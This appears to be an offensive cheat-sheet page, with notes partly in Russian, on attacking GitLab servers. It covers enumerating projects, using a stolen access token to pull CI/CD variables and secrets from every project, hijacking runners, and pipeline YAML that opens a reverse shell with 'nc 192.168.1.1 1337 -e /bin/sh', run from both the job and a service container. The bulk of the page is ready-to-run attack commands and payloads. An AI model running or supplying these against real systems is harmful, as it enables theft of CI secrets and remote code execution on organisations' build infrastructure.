---
description: Gitlab checks
---

# Gitlab

### Search for secrets

{% embed url="https://github.com/praetorian-inc/noseyparker" %}

```bash
#Scan repo
docker run -v "$PWD":/scan ghcr.io/praetorian-inc/noseyparker:latest scan .
#Get results
docker run -v "$PWD":/scan ghcr.io/praetorian-inc/noseyparker:latest report
```

### Reconnaissance

{% embed url="https://embracethered.com/blog/posts/2022/hacking-gitlab-servers/" %}

### Check public repositories

```bash
curl "https://gitlab.com/api/v4/projects?visibility=public&per_page=100"" | jq '.[] | {name, path, web_url}'
```

* `membership=true` — только проекты, где ты участник
* `per_page=100` — увеличивает количество результатов (GitLab по умолчанию возвращает 20)

**Route `/explore` allow to go behind the login panel**

### Abusing GitLab token

#### Token types:

* #### **`glpat-` (GitLab Personal Access Token)**
* #### **`gitlab-internal-` (Internal API Token)**
* #### **`glct-` (GitLab CI/CD Job Token)**
* #### **`glrt-` (GitLab Runner Token)**

#### Get variables from projects

define count pages and replace max page in seq. First take all projects id

```bash
for page in $(seq 0 110); do echo $page && curl -s --header "PRIVATE-TOKEN: <token>" "https://gitlab.example.com/api/v4/projects?per_page=100&page=$page" | jq ".[].id" >> gitlab-ids.txt; done
```

Then try get var

```bash
while IFS='' read -r LINE || [ -n "${LINE}" ]; do url="https://gitlab.example.com/api/v4/projects/$LINE"; vars=$(curl -s --header 'PRIVATE-TOKEN: token' $url/variables); [ ${#vars} -gt 5 ] && echo $vars > .tempvars && curl -s --header 'PRIVATE-TOKEN: token' $url | jq --slurpfile v .tempvars '{id: .id, git: .http_url_to_repo, vars: $v[0]}' >> gitlab-vars.txt; done <gitlab-ids.txt
```

Also try get gitlab-group vars (мне пока лень)

### Abusing GitLab Runners

{% embed url="https://frichetten.com/blog/abusing-gitlab-runners/" %}

Script for steal tasks by requesting them faster than a real runner - [https://github.com/Frichetten/gitlab-runner-research](https://github.com/Frichetten/gitlab-runner-research)



### Check projects access level&#x20;

```bash
curl --header "PRIVATE-TOKEN: <token>" "https://gitlab.com/api/v4/projects?membership=true&per_page=100"
```

* `membership=true` — только проекты, где ты участник
* `per_page=100` — увеличивает количество результатов (GitLab по умолчанию возвращает 20)

```json
[
  {
    "id": 123,
    "name": "my-repo",
    "path": "my-repo",
    "permissions": {
      "project_access": {
        "access_level": 30  # 30 = Developer
      },
      "group_access": null
    }
  }
]
```

**Уровни доступа:**

* `10` — Guest (только чтение)
* `20` — Reporter (чтение + доступ к CI/CD)
* `30` — Developer (чтение + запись + запуск CI/CD)
* `40` — Maintainer (полный доступ, кроме удаления проекта)
* `50` — Owner (полный доступ)



### CI Abuse

**Exec code in runner**

````
```yaml
stages:
  - build
  
build-job:
  image: 
    name: python:3.11-alpine
  stage: build
  script:
    - nc 192.168.1.1 1337 -e /bin/sh
  tags:
    - runner-tag                        #Check tags of runners in project settings
```
````



**Exec code in runner service**

_Services can also have privileged containers_

````
```yaml
stages:
  - build

build-job:
  image: docker:28.0.4-dind-alpine3.21
  services:
    - name: docker:28.0.4-dind-alpine3.21
      alias: docker
      command: ["nc", "192.168.1.1", "1337", "-e", "/bin/sh"]
  variables:
    DOCKER_HOST: tcp://docker:2375
    DOCKER_TLS_CERTDIR: ""        
  stage: build
  script:
    - echo waiting && sleep 999999999
  tags:
    - runner-tag                   #Check tags of runners in project settings
```
````
